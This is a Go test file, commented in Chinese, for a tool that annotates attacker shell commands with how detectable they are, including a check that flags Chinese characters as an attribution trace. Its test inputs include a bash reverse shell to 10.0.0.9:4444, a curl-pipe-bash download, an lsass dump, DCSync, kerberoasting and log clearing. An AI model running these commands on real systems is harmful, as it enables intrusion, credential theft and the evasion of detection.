package opsec

import (
	"strings"
	"testing"
)

// 可检出性知识库：命中要准（词边界，不能 "at" 命中 "cat"）、不命中要**明说没收录**
// （把"没提示"读成"没有日志"是这个功能唯一的失败方式，且是最危险的那种）。

func TestAnnotateHitsKnownPatterns(t *testing.T) {
	cases := []struct {
		cmd  string
		want string // 期望命中的笔记 id
	}{
		{"nmap -sS -p- 10.0.0.1", "portscan-syn"},
		{"masscan -p1-65535 10.0.0.0/24 --rate 10000", "portscan-syn"},
		{"hydra -L users.txt -P pass.txt ssh://10.0.0.1", "bruteforce"},
		{"crackmapexec smb 10.0.0.0/24 -u admin -p pass", "bruteforce"},
		{"procdump -ma lsass.exe lsass.dmp", "lsass-access"},
		{"python3 secretsdump.py corp/admin@10.0.0.5", "dcsync"},
		{"rubeus kerberoast /outfile:hashes.txt", "kerberoast"},
		{"sharphound --collectionmethods All", "dir-query"},
		{"bash -i >& /dev/tcp/10.0.0.9/4444 0>&1", "reverse-shell"},
		{"cat /etc/shadow", "sensitive-read"},
		{"./linpeas.sh", "privesc-enum"},
		{"history -c", "anti-forensics"},
		{"wevtutil cl Security", "anti-forensics"},
	}
	for _, c := range cases {
		res := Annotate(c.cmd)
		if res.Uncovered {
			t.Errorf("%q 该命中 %s，却报没收录", c.cmd, c.want)
			continue
		}
		found := false
		for _, n := range res.Notes {
			if n.ID == c.want {
				found = true
			}
		}
		if !found {
			ids := make([]string, 0, len(res.Notes))
			for _, n := range res.Notes {
				ids = append(ids, n.ID)
			}
			t.Errorf("%q 该命中 %s，实际 %v", c.cmd, c.want, ids)
		}
	}
}

func TestAnnotateWordBoundary(t *testing.T) {
	// "at" 不能命中 "cat"，"ir" 不能命中 "dir" —— 命中不了就如实说没收录。
	for _, cmd := range []string{"cat /etc/hostname", "dir C:\\Users", "id", "whoami", "ls -la"} {
		res := Annotate(cmd)
		if !res.Uncovered {
			ids := make([]string, 0, len(res.Notes))
			for _, n := range res.Notes {
				ids = append(ids, n.ID)
			}
			t.Errorf("%q 不该命中任何笔记（词边界），实际 %v", cmd, ids)
		}
	}
}

func TestAnnotateUncoveredSaysSo(t *testing.T) {
	res := Annotate("echo hello")
	if !res.Uncovered || res.Message == "" {
		t.Fatalf("没收录时必须显式说出来：%+v", res)
	}
	// 措辞里要写清"不代表没有日志"——这句话才是这个返回值的意义。
	if !strings.Contains(res.Message, "不代表没有日志") {
		t.Errorf("话术该写明「没收录 ≠ 没有日志」：%s", res.Message)
	}
	if res2 := Annotate("   "); !res2.Uncovered {
		t.Errorf("空命令该判为没收录：%+v", res2)
	}
}

func TestAnnotateMultipleHitsStableOrder(t *testing.T) {
	// 一条命令可以同时命中几条（扫描 + 下载执行）。输出顺序要稳定（按 id 排），
	// 否则同一手在报告与界面里的顺序会变。
	cmd := "nmap -sS 10.0.0.1 && curl http://10.0.0.1/x.sh | bash"
	a, b := Annotate(cmd), Annotate(cmd)
	if a.Uncovered || len(a.Notes) < 2 {
		t.Fatalf("该命中多条：%+v", a)
	}
	for i := range a.Notes {
		if a.Notes[i].ID != b.Notes[i].ID {
			t.Fatalf("两次标注顺序不一致：%v vs %v", a.Notes, b.Notes)
		}
		if i > 0 && a.Notes[i-1].ID > a.Notes[i].ID {
			t.Errorf("该按 id 排序：%v", a.Notes)
		}
	}
}

func TestKnowledgeEntriesAreComplete(t *testing.T) {
	// 每条笔记都要能自证：说清留在哪、给得出具体信号、标出预计可见度，并有一句人话。
	// 缺项的条目在报告里就是一行没用的字。
	seen := map[string]bool{}
	for _, n := range Knowledge {
		if n.ID == "" || seen[n.ID] {
			t.Errorf("笔记 id 缺失或重复：%q", n.ID)
		}
		seen[n.ID] = true
		// 两种条目都要能自证：关键词型给 Match，代码判定型给已知的 Detector。
		knowsMatch := len(n.Match) > 0
		knowsDetector := n.Detector == DetectorLanguage
		if !knowsMatch && !knowsDetector {
			t.Errorf("%s 既没有关键词也没有可识别的判定器：%+v", n.ID, n)
		}
		if n.Detector != DetectorNone && n.Detector != DetectorLanguage {
			t.Errorf("%s 的 Detector 取值未收录：%q", n.ID, n.Detector)
		}
		if n.Title == "" || len(n.Where) == 0 || n.Note == "" {
			t.Errorf("%s 缺字段：%+v", n.ID, n)
		}
		if len(n.Signals) == 0 {
			t.Errorf("%s 没给具体信号——那这条笔记就只是一句空话", n.ID)
		}
		if ExposureRank(n.Exposure) == 0 {
			t.Errorf("%s 的可见度取值不在 低/中/高 里：%q", n.ID, n.Exposure)
		}
	}
}

// 语言痕迹（P41）：命令里出现**汉字**时才标——不是"非 ASCII"。
// 全角标点、emoji、重音字母都不指向任何母语，标它们只会制造噪声。
func TestAnnotateFlagsHanCharacters(t *testing.T) {
	res := Annotate(`echo "测试注入点" > /tmp/x`)
	if res.Uncovered {
		t.Fatalf("带汉字的命令该有笔记：%+v", res)
	}
	var hit *Note
	for i := range res.Notes {
		if res.Notes[i].ID == "language-trace" {
			hit = &res.Notes[i]
		}
	}
	if hit == nil {
		t.Fatalf("该命中 language-trace：%+v", res.Notes)
	}
	if hit.Detector != DetectorLanguage {
		t.Errorf("该条该标明由代码判定：%+v", hit)
	}
	// 回执要说清**具体是哪几个字**——只写"含汉字"，读的人还得自己回去翻命令。
	joined := strings.Join(hit.Signals, " | ")
	for _, want := range []string{"本次命中：", "测", "试"} {
		if !strings.Contains(joined, want) {
			t.Errorf("命中回执该点明 %q：%s", want, joined)
		}
	}
}

func TestAnnotateIgnoresNonHanNonASCII(t *testing.T) {
	// 全角标点 / emoji / 重音字母：不是任何一种母语的线索，不该标。
	for _, cmd := range []string{"echo hello", "curl http://x/％20", "printf 'café'", "echo '🚀'"} {
		res := Annotate(cmd)
		for _, n := range res.Notes {
			if n.ID == "language-trace" {
				t.Errorf("%q 不该被判成语言痕迹（判的是汉字，不是「非 ASCII」）：%+v", cmd, n)
			}
		}
	}
}

func TestHanRunesDedupes(t *testing.T) {
	got := hanRunes("测测试试 test 测")
	if strings.Join(got, "") != "测试" {
		t.Errorf("该去重并保持出现顺序：%v", got)
	}
	if len(hanRunes("no chinese here")) != 0 {
		t.Error("没有汉字时该返回空")
	}
}
